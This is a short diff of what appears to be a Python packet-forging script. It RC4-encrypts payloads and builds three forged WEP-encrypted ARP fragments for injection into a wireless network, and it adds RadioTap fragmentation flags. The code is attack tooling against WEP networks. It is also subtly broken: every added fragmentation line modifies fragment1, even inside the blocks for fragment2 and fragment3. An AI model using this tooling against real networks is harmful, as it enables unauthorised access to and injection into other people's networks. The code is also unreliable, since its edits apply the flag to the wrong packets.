@@ -51,7 +51,7 @@ plaintext3 = text3 + icv3
 
 # Encryption RC4
 seed = arp.iv+key
-cipher = RC4(seed, streaming=True)
+cipher = RC4(seed, streaming=False)
 
 ciphertext1 = cipher.crypt(plaintext1)
 ciphertext2 = cipher.crypt(plaintext2)
@@ -64,6 +64,7 @@ fragment1 = arp.copy()
 # Modifying arp parameters
 fragment1.icv = struct.unpack('!L', ciphertext1[-4:])[0]
 fragment1.wepdata = ciphertext1
+fragment1[RadioTap].Fragmentation = 1
 fragment1.FCfield = 0x845
 lst.append(fragment1)
 
@@ -71,6 +72,7 @@ fragment2 = arp.copy()
 # Modifying arp parameters
 fragment2.icv = struct.unpack('!L', ciphertext2[-4:])[0]
 fragment2.wepdata = ciphertext2
+fragment1[RadioTap].Fragmentation = 1
 fragment2.SC += 1
 fragment2.FCfield = 0x845
 lst.append(fragment2)
@@ -79,6 +81,7 @@ fragment3 = arp.copy()
 # Modifying arp parameters
 fragment3.icv = struct.unpack('!L', ciphertext3[-4:])[0]
 fragment3.wepdata = ciphertext3
+fragment1[RadioTap].Fragmentation = 1
 fragment3.SC += 2
 fragment3.FCfield = 0x841
 lst.append(fragment3)
